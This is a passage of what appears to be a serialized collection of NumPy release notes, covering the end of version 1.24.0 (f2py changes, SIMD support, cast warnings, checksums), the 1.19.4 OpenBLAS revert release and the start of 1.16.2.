CPP macros that one can use within C-expressions of signature files\n  are prefixed with ``f2py_``. For example, one should use ``f2py_len(x)``\n  instead of ``len(x)``\n* A new construct ``character(f2py_len=...)`` is introduced to support\n  returning assumed length character strings (e.g. ``character(len=*)``) from\n  wrapper functions\n\nA hook to support rewriting ``f2py`` internal data structures after reading all\nits input files is introduced. This is required, for instance, for BC of SciPy\nsupport where character arguments are treated as character strings arguments in\n``C`` expressions.\n\n(`gh-19388 <https://github.com/numpy/numpy/pull/19388>`__)\n\nIBM zSystems Vector Extension Facility (SIMD)\n---------------------------------------------\nAdded support for SIMD extensions of zSystem (z13, z14, z15), through the\nuniversal intrinsics interface. This support leads to performance improvements\nfor all SIMD kernels implemented using the universal intrinsics, including the\nfollowing operations: rint, floor, trunc, ceil, sqrt, absolute, square,\nreciprocal, tanh, sin, cos, equal, not_equal, greater, greater_equal, less,\nless_equal, maximum, minimum, fmax, fmin, argmax, argmin, add, subtract,\nmultiply, divide.\n\n(`gh-20913 <https://github.com/numpy/numpy/pull/20913>`__)\n\nNumPy now gives floating point errors in casts\n----------------------------------------------\nIn most cases, NumPy previously did not give floating point warnings or errors\nwhen these happened during casts.  For examples, casts like::\n\n    np.array([2e300]).astype(np.float32)   overflow for float32\n    np.array([np.inf]).astype(np.int64)\n\nShould now generally give floating point warnings.  These warnings should warn\nthat floating point overflow occurred.  For errors when converting floating\npoint values to integers users should expect invalid value warnings.\n\nUsers can modify the behavior of these warnings using ``np.errstate``.\n\nNote that for float to int casts, the exact warnings that are given may\nbe platform dependent.  For example::\n\n    arr = np.full(100, value=1000, dtype=np.float64)\n    arr.astype(np.int8)\n\nMay give a result equivalent to (the intermediate cast means no warning is\ngiven)::\n\n    arr.astype(np.int64).astype(np.int8)\n\nMay return an undefined result, with a warning set::\n\n    RuntimeWarning: invalid value encountered in cast\n\nThe precise behavior is subject to the C99 standard and its implementation in\nboth software and hardware.\n\n(`gh-21437 <https://github.com/numpy/numpy/pull/21437>`__)\n\nF2PY supports the value attribute\n---------------------------------\nThe Fortran standard requires that variables declared with the ``value``\nattribute must be passed by value instead of reference. F2PY now supports this\nuse pattern correctly. So ``integer, intent(in), value :: x`` in Fortran codes\nwill have correct wrappers generated.\n\n(`gh-21807 <https://github.com/numpy/numpy/pull/21807>`__)\n\nAdded pickle support for third-party BitGenerators\n--------------------------------------------------\nThe pickle format for bit generators was extended to allow each bit generator\nto supply its own constructor when during pickling. Previous  versions of NumPy\nonly supported unpickling ``Generator`` instances created with one of the core\nset of bit generators supplied with NumPy. Attempting to unpickle a\n``Generator`` that used a third-party bit generators would fail since the\nconstructor used during the unpickling was only aware of the bit generators\nincluded in NumPy.\n\n(`gh-22014 <https://github.com/numpy/numpy/pull/22014>`__)\n\narange() now explicitly fails with dtype=str\n---------------------------------------------\nPreviously, the ``np.arange(n, dtype=str)`` function worked for ``n=1`` and\n``n=2``, but would raise a non-specific exception message for other values of\n``n``. Now, it raises a `TypeError` informing that ``arange`` does not support\nstring dtypes::\n\n    >>> np.arange(2, dtype=str)\n    Traceback (most recent call last)\n       ...\n    TypeError: arange() not supported for inputs with DType <class 'numpy.dtype[str_]'>.\n\n(`gh-22055 <https://github.com/numpy/numpy/pull/22055>`__)\n\n``numpy.typing`` protocols are now runtime checkable\n----------------------------------------------------\nThe protocols used in ``numpy.typing.ArrayLike`` and ``numpy.typing.DTypeLike``\nare now properly marked as runtime checkable, making them easier to use for\nruntime type checkers.\n\n(`gh-22357 <https://github.com/numpy/numpy/pull/22357>`__)\n\n\nPerformance improvements and changes\n====================================\n\nFaster version of ``np.isin`` and ``np.in1d`` for integer arrays\n----------------------------------------------------------------\n``np.in1d`` (used by ``np.isin``) can now switch to a faster algorithm (up to\n>10x faster) when it is passed two integer arrays.  This is often automatically\nused, but you can use ``kind=\"sort\"`` or ``kind=\"table\"`` to force the old or\nnew method, respectively.\n\n(`gh-12065 <https://github.com/numpy/numpy/pull/12065>`__)\n\nFaster comparison operators\n----------------------------\nThe comparison functions (``numpy.equal``, ``numpy.not_equal``, ``numpy.less``,\n``numpy.less_equal``, ``numpy.greater`` and ``numpy.greater_equal``) are now\nmuch faster as they are now vectorized with universal intrinsics. For a CPU\nwith SIMD extension AVX512BW, the performance gain is up to 2.57x, 1.65x and\n19.15x for integer, float and boolean data types, respectively (with N=50000).\n\n(`gh-21483 <https://github.com/numpy/numpy/pull/21483>`__)\n\n\nChanges\n=======\n\nBetter reporting of integer division overflow\n---------------------------------------------\nInteger division overflow of scalars and arrays used to provide a\n``RuntimeWarning`` and the return value was undefined leading to crashes at\nrare occasions::\n\n    >>> np.array([np.iinfo(np.int32).min]*10, dtype=np.int32) // np.int32(-1)\n    <stdin>:1: RuntimeWarning: divide by zero encountered in floor_divide\n    array([0, 0, 0, 0, 0, 0, 0, 0, 0, 0], dtype=int32)\n\nInteger division overflow now returns the input dtype's minimum value and raise\nthe following ``RuntimeWarning``::\n\n    >>> np.array([np.iinfo(np.int32).min]*10, dtype=np.int32) // np.int32(-1)\n    <stdin>:1: RuntimeWarning: overflow encountered in floor_divide\n    array([-2147483648, -2147483648, -2147483648, -2147483648, -2147483648,\n           -2147483648, -2147483648, -2147483648, -2147483648, -2147483648],\n          dtype=int32)\n\n(`gh-21506 <https://github.com/numpy/numpy/pull/21506>`__)\n\n``masked_invalid`` now modifies the mask in-place\n-------------------------------------------------\nWhen used with ``copy=False``, ``numpy.ma.masked_invalid`` now modifies the\ninput masked array in-place.  This makes it behave identically to\n``masked_where`` and better matches the documentation.\n\n(`gh-22046 <https://github.com/numpy/numpy/pull/22046>`__)\n\n``nditer``/``NpyIter`` allows all allocating all operands\n---------------------------------------------------------\nThe NumPy iterator available through ``np.nditer`` in Python and as ``NpyIter``\nin C now supports allocating all arrays.  The iterator shape defaults to ``()``\nin this case.  The operands dtype must be provided, since a \"common dtype\"\ncannot be inferred from the other inputs.\n\n(`gh-22457 <https://github.com/numpy/numpy/pull/22457>`__)\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    d60311246bd71b177258ce06e2a4ec57  numpy-1.24.0-cp310-cp310-macosx_10_9_x86_64.whl\n    02022b335938af55cb83bbaebdbff8e1  numpy-1.24.0-cp310-cp310-macosx_11_0_arm64.whl\n    02b35d6612369fcc614c6223aaec0119  numpy-1.24.0-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    7b8ad389a9619db3e1f8243fc0cfe63d  numpy-1.24.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    6ff4acbb7b1258ccbd528c151eb0fe84  numpy-1.24.0-cp310-cp310-win32.whl\n    d194c96601222db97b0af54fce1cfb1d  numpy-1.24.0-cp310-cp310-win_amd64.whl\n    5fe4eb551a9312e37492da9f5bfb8545  numpy-1.24.0-cp311-cp311-macosx_10_9_x86_64.whl\n    a8e836a768f73e9f509b11c3873c7e09  numpy-1.24.0-cp311-cp311-macosx_11_0_arm64.whl\n    10404d6d1a5a9624f85018f61110b2be  numpy-1.24.0-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    cfdb0cb844f1db9be2cde998be54d65f  numpy-1.24.0-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    73bc66ad3ae8656ba18d64db98feb5e1  numpy-1.24.0-cp311-cp311-win32.whl\n    4bbc30a53009c48d364d4dc2c612af95  numpy-1.24.0-cp311-cp311-win_amd64.whl\n    94ce5f6a09605a9675a0d464b1ec6597  numpy-1.24.0-cp38-cp38-macosx_10_9_x86_64.whl\n    e5e42b69a209eda7e6895dda39ea8610  numpy-1.24.0-cp38-cp38-macosx_11_0_arm64.whl\n    36eb6143d1e2aac3c618275edf636983  numpy-1.24.0-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    712c3718e8b53ff04c626cc4c78492aa  numpy-1.24.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    0a1a48a8e458bd4ce581169484c17e4f  numpy-1.24.0-cp38-cp38-win32.whl\n    c8ab7e4b919548663568a5b5a8b5eab4  numpy-1.24.0-cp38-cp38-win_amd64.whl\n    1783a5d769566111d93c474c79892c01  numpy-1.24.0-cp39-cp39-macosx_10_9_x86_64.whl\n    c9e77130674372c73f8209d58396624d  numpy-1.24.0-cp39-cp39-macosx_11_0_arm64.whl\n    14c0f2f52f20f13a81bba7df27f30145  numpy-1.24.0-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    c106393b46fa0302dbac49b14a4dfed4  numpy-1.24.0-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    c83e6d6946f32820f166c3f1ff010ab6  numpy-1.24.0-cp39-cp39-win32.whl\n    acd5a4737d1094d5f40afa584dbd6d79  numpy-1.24.0-cp39-cp39-win_amd64.whl\n    26e32f942c9fd62f64fd9bf6df95b5b1  numpy-1.24.0-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    4f027df0cc313ca626b106849999de13  numpy-1.24.0-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    ac58db9a90d0bec95bc7850b9e462f34  numpy-1.24.0-pp38-pypy38_pp73-win_amd64.whl\n    1ca41c84ad9a116402a025d21e35bc64  numpy-1.24.0.tar.gz\n\nSHA256\n------\n::\n\n    6e73a1f4f5b74a42abb55bc2b3d869f1b38cbc8776da5f8b66bf110284f7a437  numpy-1.24.0-cp310-cp310-macosx_10_9_x86_64.whl\n    9387c7d6d50e8f8c31e7bfc034241e9c6f4b3eb5db8d118d6487047b922f82af  numpy-1.24.0-cp310-cp310-macosx_11_0_arm64.whl\n    7ad6a024a32ee61d18f5b402cd02e9c0e22c0fb9dc23751991b3a16d209d972e  numpy-1.24.0-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    73cf2c5b5a07450f20a0c8e04d9955491970177dce8df8d6903bf253e53268e0  numpy-1.24.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    cec79ff3984b2d1d103183fc4a3361f5b55bbb66cb395cbf5a920a4bb1fd588d  numpy-1.24.0-cp310-cp310-win32.whl\n    4f5e78b8b710cd7cd1a8145994cfffc6ddd5911669a437777d8cedfce6c83a98  numpy-1.24.0-cp310-cp310-win_amd64.whl\n    4445f472b246cad6514cc09fbb5ecb7aab09ca2acc3c16f29f8dca6c468af501  numpy-1.24.0-cp311-cp311-macosx_10_9_x86_64.whl\n    ec3e5e8172a0a6a4f3c2e7423d4a8434c41349141b04744b11a90e017a95bad5  numpy-1.24.0-cp311-cp311-macosx_11_0_arm64.whl\n    f9168790149f917ad8e3cf5047b353fefef753bd50b07c547da0bdf30bc15d91  numpy-1.24.0-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    ada6c1e9608ceadaf7020e1deea508b73ace85560a16f51bef26aecb93626a72  numpy-1.24.0-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    f3c4a9a9f92734a4728ddbd331e0124eabbc968a0359a506e8e74a9b0d2d419b  numpy-1.24.0-cp311-cp311-win32.whl\n    90075ef2c6ac6397d0035bcd8b298b26e481a7035f7a3f382c047eb9c3414db0  numpy-1.24.0-cp311-cp311-win_amd64.whl\n    0885d9a7666cafe5f9876c57bfee34226e2b2847bfb94c9505e18d81011e5401  numpy-1.24.0-cp38-cp38-macosx_10_9_x86_64.whl\n    e63d2157f9fc98cc178870db83b0e0c85acdadd598b134b00ebec9e0db57a01f  numpy-1.24.0-cp38-cp38-macosx_11_0_arm64.whl\n    cf8960f72997e56781eb1c2ea256a70124f92a543b384f89e5fb3503a308b1d3  numpy-1.24.0-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    2f8e0df2ecc1928ef7256f18e309c9d6229b08b5be859163f5caa59c93d53646  numpy-1.24.0-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    fe44e925c68fb5e8db1334bf30ac1a1b6b963b932a19cf41d2e899cf02f36aab  numpy-1.24.0-cp38-cp38-win32.whl\n    d7f223554aba7280e6057727333ed357b71b7da7422d02ff5e91b857888c25d1  numpy-1.24.0-cp38-cp38-win_amd64.whl\n    ab11f6a7602cf8ea4c093e091938207de3068c5693a0520168ecf4395750f7ea  numpy-1.24.0-cp39-cp39-macosx_10_9_x86_64.whl\n    12bba5561d8118981f2f1ff069ecae200c05d7b6c78a5cdac0911f74bc71cbd1  numpy-1.24.0-cp39-cp39-macosx_11_0_arm64.whl\n    9af91f794d2d3007d91d749ebc955302889261db514eb24caef30e03e8ec1e41  numpy-1.24.0-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    8b1ddfac6a82d4f3c8e99436c90b9c2c68c0bb14658d1684cdd00f05fab241f5  numpy-1.24.0-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    ac4fe68f1a5a18136acebd4eff91aab8bed00d1ef2fdb34b5d9192297ffbbdfc  numpy-1.24.0-cp39-cp39-win32.whl\n    667b5b1f6a352419e340f6475ef9930348ae5cb7fca15f2cc3afcb530823715e  numpy-1.24.0-cp39-cp39-win_amd64.whl\n    4d01f7832fa319a36fd75ba10ea4027c9338ede875792f7bf617f4b45056fc3a  numpy-1.24.0-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    dbb0490f0a880700a6cc4d000384baf19c1f4df59fff158d9482d4dbbca2b239  numpy-1.24.0-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    0104d8adaa3a4cc60c2777cab5196593bf8a7f416eda133be1f3803dd0838886  numpy-1.24.0-pp38-pypy38_pp73-win_amd64.whl\n    c4ab7c9711fe6b235e86487ca74c1b092a6dd59a3cb45b63241ea0a148501853  numpy-1.24.0.tar.gz\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.19.4": "==========================\n\nNumPy 1.19.4 is a quick release to revert the OpenBLAS library version.  It was\nhoped that the 0.3.12 OpenBLAS version used in 1.19.3 would work around the\nMicrosoft fmod bug, but problems in some docker environments turned up. Instead,\n1.19.4 will use the older library and run a sanity check on import, raising an\nerror if the problem is detected. Microsoft is aware of the problem and has\npromised a fix, users should upgrade when it becomes available.\n\nThis release supports Python 3.6-3.9\n\nContributors\n============\n\nA total of 1 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n\nPull requests merged\n====================\n\nA total of 2 pull requests were merged for this release.\n\n* `17679 <https://github.com/numpy/numpy/pull/17679>`__: MAINT: Add check for Windows 10 version 2004 bug.\n* `17680 <https://github.com/numpy/numpy/pull/17680>`__: REV: Revert OpenBLAS to 1.19.2 version for 1.19.4\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    09b6f7f17ca61f0f3b943d4107ea6a6c  numpy-1.19.4-cp36-cp36m-macosx_10_9_x86_64.whl\n    bfb801672e0d9916407352f7158b5584  numpy-1.19.4-cp36-cp36m-manylinux1_i686.whl\n    2469be359c8c383509eaded8e758488a  numpy-1.19.4-cp36-cp36m-manylinux1_x86_64.whl\n    4af398903b0957ad3a40ec17631879ed  numpy-1.19.4-cp36-cp36m-manylinux2010_i686.whl\n    bb3f911ba616d36a2daff5b8e1402b1b  numpy-1.19.4-cp36-cp36m-manylinux2010_x86_64.whl\n    3b754c1135f7aa3e6a7c1f46af6a84c9  numpy-1.19.4-cp36-cp36m-manylinux2014_aarch64.whl\n    9db8749b90405780614f126c77eef3bb  numpy-1.19.4-cp36-cp36m-win32.whl\n    25bc59391b8b4f06eb28e74e97afc488  numpy-1.19.4-cp36-cp36m-win_amd64.whl\n    355d7f49b9e442f9e73580e64c8bf2c2  numpy-1.19.4-cp37-cp37m-macosx_10_9_x86_64.whl\n    3c1ce8ca6f6f11ea9d49859b2ffb70cf  numpy-1.19.4-cp37-cp37m-manylinux1_i686.whl\n    5524143ee95cc7e3400dbbff709de7cd  numpy-1.19.4-cp37-cp37m-manylinux1_x86_64.whl\n    c40206040b8ddb62309cbef1cdf0fa82  numpy-1.19.4-cp37-cp37m-manylinux2010_i686.whl\n    552839ea3bc2dfc98611254f8188feb8  numpy-1.19.4-cp37-cp37m-manylinux2010_x86_64.whl\n    2e5c50e57cff5085ffb32185591e49ed  numpy-1.19.4-cp37-cp37m-manylinux2014_aarch64.whl\n    ce6c1cd93d5fc56d0de608b84cc14a7e  numpy-1.19.4-cp37-cp37m-win32.whl\n    a73acaea97da74db366372b3d70219a7  numpy-1.19.4-cp37-cp37m-win_amd64.whl\n    2f52c91231b2b3c54535dee98a5ad0a3  numpy-1.19.4-cp38-cp38-macosx_10_9_x86_64.whl\n    e619d04f2ac42a9feb0efcc1d9901d94  numpy-1.19.4-cp38-cp38-manylinux1_i686.whl\n    01c2f102e73b2569cf3ebe5eab112c4e  numpy-1.19.4-cp38-cp38-manylinux1_x86_64.whl\n    6a66109907b356ddd67f1e282e1879e6  numpy-1.19.4-cp38-cp38-manylinux2010_i686.whl\n    79354b01e11789bb5d12c9edc754297b  numpy-1.19.4-cp38-cp38-manylinux2010_x86_64.whl\n    4f1b335dfe5c7fcf5c8c89983cef9f0b  numpy-1.19.4-cp38-cp38-manylinux2014_aarch64.whl\n    949a5f9e9a75b9cbb3c74e4bf4eb0683  numpy-1.19.4-cp38-cp38-win32.whl\n    27eb1b83f3cac67fb26c7fe9a25b0635  numpy-1.19.4-cp38-cp38-win_amd64.whl\n    ae1e4a06e721e83b530860835c708690  numpy-1.19.4-cp39-cp39-macosx_10_9_x86_64.whl\n    d263c7d04c46d5ecca3b32ad11925bad  numpy-1.19.4-cp39-cp39-manylinux1_i686.whl\n    132e95910d76b045caf1883146ec34a6  numpy-1.19.4-cp39-cp39-manylinux1_x86_64.whl\n    4d4e5f147fe6fdedbdde4df9eaf2a4b1  numpy-1.19.4-cp39-cp39-manylinux2010_i686.whl\n    5ac2071e995ff4fc066741b1edcc159c  numpy-1.19.4-cp39-cp39-manylinux2010_x86_64.whl\n    5d678c6cc45ee3ee976e8b3b2ebe9c13  numpy-1.19.4-cp39-cp39-manylinux2014_aarch64.whl\n    7bc02e21133a1b82994c81c7521156a8  numpy-1.19.4-cp39-cp39-win32.whl\n    55c735347e8fb2ce3674243b38b3cee3  numpy-1.19.4-cp39-cp39-win_amd64.whl\n    673234a8dc2d3d3912c24c64aef6263e  numpy-1.19.4-pp36-pypy36_pp73-manylinux2010_x86_64.whl\n    a25e91ea62ffd37ccf8e0d917484962c  numpy-1.19.4.tar.gz\n    d40f6fcf611ab40eed4ff90606e05307  numpy-1.19.4.zip\n\nSHA256\n------\n::\n\n    e9b30d4bd69498fc0c3fe9db5f62fffbb06b8eb9321f92cc970f2969be5e3949  numpy-1.19.4-cp36-cp36m-macosx_10_9_x86_64.whl\n    fedbd128668ead37f33917820b704784aff695e0019309ad446a6d0b065b57e4  numpy-1.19.4-cp36-cp36m-manylinux1_i686.whl\n    8ece138c3a16db8c1ad38f52eb32be6086cc72f403150a79336eb2045723a1ad  numpy-1.19.4-cp36-cp36m-manylinux1_x86_64.whl\n    64324f64f90a9e4ef732be0928be853eee378fd6a01be21a0a8469c4f2682c83  numpy-1.19.4-cp36-cp36m-manylinux2010_i686.whl\n    ad6f2ff5b1989a4899bf89800a671d71b1612e5ff40866d1f4d8bcf48d4e5764  numpy-1.19.4-cp36-cp36m-manylinux2010_x86_64.whl\n    d6c7bb82883680e168b55b49c70af29b84b84abb161cbac2800e8fcb6f2109b6  numpy-1.19.4-cp36-cp36m-manylinux2014_aarch64.whl\n    13d166f77d6dc02c0a73c1101dd87fdf01339febec1030bd810dcd53fff3b0f1  numpy-1.19.4-cp36-cp36m-win32.whl\n    448ebb1b3bf64c0267d6b09a7cba26b5ae61b6d2dbabff7c91b660c7eccf2bdb  numpy-1.19.4-cp36-cp36m-win_amd64.whl\n    27d3f3b9e3406579a8af3a9f262f5339005dd25e0ecf3cf1559ff8a49ed5cbf2  numpy-1.19.4-cp37-cp37m-macosx_10_9_x86_64.whl\n    16c1b388cc31a9baa06d91a19366fb99ddbe1c7b205293ed072211ee5bac1ed2  numpy-1.19.4-cp37-cp37m-manylinux1_i686.whl\n    e5b6ed0f0b42317050c88022349d994fe72bfe35f5908617512cd8c8ef9da2a9  numpy-1.19.4-cp37-cp37m-manylinux1_x86_64.whl\n    18bed2bcb39e3f758296584337966e68d2d5ba6aab7e038688ad53c8f889f757  numpy-1.19.4-cp37-cp37m-manylinux2010_i686.whl\n    fe45becb4c2f72a0907c1d0246ea6449fe7a9e2293bb0e11c4e9a32bb0930a15  numpy-1.19.4-cp37-cp37m-manylinux2010_x86_64.whl\n    6d7593a705d662be5bfe24111af14763016765f43cb6923ed86223f965f52387  numpy-1.19.4-cp37-cp37m-manylinux2014_aarch64.whl\n    6ae6c680f3ebf1cf7ad1d7748868b39d9f900836df774c453c11c5440bc15b36  numpy-1.19.4-cp37-cp37m-win32.whl\n    9eeb7d1d04b117ac0d38719915ae169aa6b61fca227b0b7d198d43728f0c879c  numpy-1.19.4-cp37-cp37m-win_amd64.whl\n    cb1017eec5257e9ac6209ac172058c430e834d5d2bc21961dceeb79d111e5909  numpy-1.19.4-cp38-cp38-macosx_10_9_x86_64.whl\n    edb01671b3caae1ca00881686003d16c2209e07b7ef8b7639f1867852b948f7c  numpy-1.19.4-cp38-cp38-manylinux1_i686.whl\n    f29454410db6ef8126c83bd3c968d143304633d45dc57b51252afbd79d700893  numpy-1.19.4-cp38-cp38-manylinux1_x86_64.whl\n    ec149b90019852266fec2341ce1db513b843e496d5a8e8cdb5ced1923a92faab  numpy-1.19.4-cp38-cp38-manylinux2010_i686.whl\n    1aeef46a13e51931c0b1cf8ae1168b4a55ecd282e6688fdb0a948cc5a1d5afb9  numpy-1.19.4-cp38-cp38-manylinux2010_x86_64.whl\n    08308c38e44cc926bdfce99498b21eec1f848d24c302519e64203a8da99a97db  numpy-1.19.4-cp38-cp38-manylinux2014_aarch64.whl\n    5734bdc0342aba9dfc6f04920988140fb41234db42381cf7ccba64169f9fe7ac  numpy-1.19.4-cp38-cp38-win32.whl\n    09c12096d843b90eafd01ea1b3307e78ddd47a55855ad402b157b6c4862197ce  numpy-1.19.4-cp38-cp38-win_amd64.whl\n    e452dc66e08a4ce642a961f134814258a082832c78c90351b75c41ad16f79f63  numpy-1.19.4-cp39-cp39-macosx_10_9_x86_64.whl\n    a5d897c14513590a85774180be713f692df6fa8ecf6483e561a6d47309566f37  numpy-1.19.4-cp39-cp39-manylinux1_i686.whl\n    a09f98011236a419ee3f49cedc9ef27d7a1651df07810ae430a6b06576e0b414  numpy-1.19.4-cp39-cp39-manylinux1_x86_64.whl\n    50e86c076611212ca62e5a59f518edafe0c0730f7d9195fec718da1a5c2bb1fc  numpy-1.19.4-cp39-cp39-manylinux2010_i686.whl\n    f0d3929fe88ee1c155129ecd82f981b8856c5d97bcb0d5f23e9b4242e79d1de3  numpy-1.19.4-cp39-cp39-manylinux2010_x86_64.whl\n    c42c4b73121caf0ed6cd795512c9c09c52a7287b04d105d112068c1736d7c753  numpy-1.19.4-cp39-cp39-manylinux2014_aarch64.whl\n    8cac8790a6b1ddf88640a9267ee67b1aee7a57dfa2d2dd33999d080bc8ee3a0f  numpy-1.19.4-cp39-cp39-win32.whl\n    4377e10b874e653fe96985c05feed2225c912e328c8a26541f7fc600fb9c637b  numpy-1.19.4-cp39-cp39-win_amd64.whl\n    2a2740aa9733d2e5b2dfb33639d98a64c3b0f24765fed86b0fd2aec07f6a0a08  numpy-1.19.4-pp36-pypy36_pp73-manylinux2010_x86_64.whl\n    fe836a685d6838dbb3f603caef01183ea98e88febf4ce956a2ea484a75378413  numpy-1.19.4.tar.gz\n    141ec3a3300ab89c7f2b0775289954d193cc8edb621ea05f99db9cb181530512  numpy-1.19.4.zip\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA1\n\n==========================\n", "1.16.2": "==========================\n\nNumPy 1.16.2 is a quick release fixing several problems encountered on Windows.\nThe Python versions supported are 2.7 and 3.5-3.7. The Windows problems\naddressed are:\n\n- - DLL load problems for NumPy wheels on Windows,\n- - distutils command line parsing on Windows.\n\nThere is also a regression fix correcting signed zeros produced by divmod, see\nbelow for details.\n\nDownstream developers building this release should use Cython >= 0.29.2 and, if\nusing OpenBLAS, OpenBLAS > v0.3.4.\n\nIf you are installing using pip, you may encounter a problem with older\ninstalled versions of NumPy that pip did not delete becoming mixed with the\ncurrent version, resulting in an ``ImportError``. That problem is particularly\ncommon on Debian derived distributions due to a modified pip.  The fix is to\nmake sure all previous NumPy versions installed by pip have been removed. See\n`12736 <https://github.com/numpy/numpy/issues/12736>`__ for discussion of the\nissue.\n\n\nCompatibility notes\n===================\n\nSigned zero when using divmod\n- -----------------------------\nStarting in version 1.12.0, numpy incorrectly returned a negatively signed zero\nwhen using the ``divmod`` and ``floor_divide`` functions when the result was\nzero. For example::\n\n   >>> np.zeros(10)//1\n   array([-0., -0., -0., -0., -0., -0., -0., -0., -0., -0.])\n\nWith this release, the result is correctly returned as a positively signed\nzero::\n\n   >>> np.zeros(10)//1\n   array([0., 0., 0., 0., 0., 0., 0., 0., 0., 0.])\n\n\nContributors\n============\n\nA total of 5 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Eric Wieser\n* Matti Picus\n* Tyler Reddy\n* Tony LaTorre +\n\n\nPull requests merged\n====================\n\nA total of 7 pull requests were merged for this release.\n\n* `12909 <https://github.com/numpy/numpy/pull/12909>`__: TST: fix vmImage dispatch in Azure\n* `12923 <https://github.com/numpy/numpy/pull/12923>`__: MAINT: remove complicated test of multiarray import failure mode\n* `13020 <https://github.com/numpy/numpy/pull/13020>`__: BUG: fix signed zero behavior in npy_divmod\n* `13026 <https://github.com/numpy/numpy/pull/13026>`__: MAINT: Add functions to parse shell-strings in the platform-native...\n* `13028 <https://github.com/numpy/numpy/pull/13028>`__: BUG: Fix regression in parsing of F90 and F77 environment variables\n* `13038 <https://github.com/numpy/numpy/pull/13038>`__: BUG: parse shell escaping in extra_compile_args and extra_link_args\n* `13041 <https://github.com/numpy/numpy/pull/13041>`__: BLD: Windows absolute path DLL loading\n\nChecksums\n=========\n\nMD5\n- ---\n\n    a166c7e850f9375552f9950ba95f3a8a  numpy-1.16.2-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    cfc866763a75e7cb247c189e141e4506  numpy-1.16.2-cp27-cp27m-manylinux1_i686.whl\n    0756e1901d81033143ad55583118598e  numpy-1.16.2-cp27-cp27m-manylinux1_x86_64.whl\n    1242a10df37701abe8c8afc59809e1ac  numpy-1.16.2-cp27-cp27m-win32.whl\n    60da6aed692fc96c97efde2daca52d6f  numpy-1.16.2-cp27-cp27m-win_amd64.whl\n    62b92da3423dd59230c9369a43299506  numpy-1.16.2-cp27-cp27mu-manylinux1_i686.whl\n    5125ec60d3895d89e5d6d71d9e21b349  numpy-1.16.2-cp27-cp27mu-manylinux1_x86_64.whl\n    15bbe3a9ac6024ac631ed420c04fde47  numpy-1.16.2-cp35-cp35m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    ca025ce06f5bc7b81627bc5bf523d589  numpy-1.16.2-cp35-cp35m-manylinux1_i686.whl\n    ca9953287417064b44a47a6ec92c797c  numpy-1.16.2-cp35-cp35m-manylinux1_x86_64.whl\n    f8fa8bda14131b2714c42b775dfde349  numpy-1.16.2-cp35-cp35m-win32.whl\n    ce7abc3bb59c549ffe3b56984a291eaa  numpy-1.16.2-cp35-cp35m-win_amd64.whl\n    4f26f55f35c58b4228cb3f60cb98f32d  numpy-1.16.2-cp36-cp36m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    ac1e770a95ff3f8a47f74e64bd034768  numpy-1.16.2-cp36-cp36m-manylinux1_i686.whl\n    990a95c5f6bb34ed5588c996890bf9c7  numpy-1.16.2-cp36-cp36m-manylinux1_x86_64.whl\n    79bbaffa096bbbaf42c029bf85df5ac2  numpy-1.16.2-cp36-cp36m-win32.whl\n    83ddd33ccf7a434895ade64199424a07  numpy-1.16.2-cp36-cp36m-win_amd64.whl\n    ee8c8d67fa75a2c4a733fc491590419a  numpy-1.16.2-cp37-cp37m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    4fce2fe91abe1e8b09232c5aaafa484a  numpy-1.16.2-cp37-cp37m-manylinux1_i686.whl\n    9cac844e1fc29972e63cb80512379805  numpy-1.16.2-cp37-cp37m-manylinux1_x86_64.whl\n    38d9fccdc6ae4420c9ee5303f1298974  numpy-1.16.2-cp37-cp37m-win32.whl\n    a1dcfcbe4993d77357bb2213aacf9e82  numpy-1.16.2-cp37-cp37m-win_amd64.whl\n    4fc754be7ec3e0f80b042d907e99f4ad  numpy-1.16.2.tar.gz\n    ec99ec2763a6be3817675f92b8847d3c  numpy-1.16.2.zip\n\nSHA256\n- ------\n\n    972ea92f9c1b54cc1c1a3d8508e326c0114aaf0f34996772a30f3f52b73b942f  numpy-1.16.2-cp27-cp27m-macosx_10_6_intel.macosx_10_9_intel.macosx_10_9_x86_64.macosx_10_10_intel.macosx_10_10_x86_64.whl\n    1980f8d84548d74921685f68096911585fee393975f53797614b34d4f409b6da  numpy-1.16.2-cp27-cp27m-manylinux1_i686.whl\n    560ceaa24f971ab37dede7ba030fc5d8fa173305d94365f814d9523ffd5d5916  numpy-1.16.2-cp27-cp27m-manylinux1_x86_64.whl\n    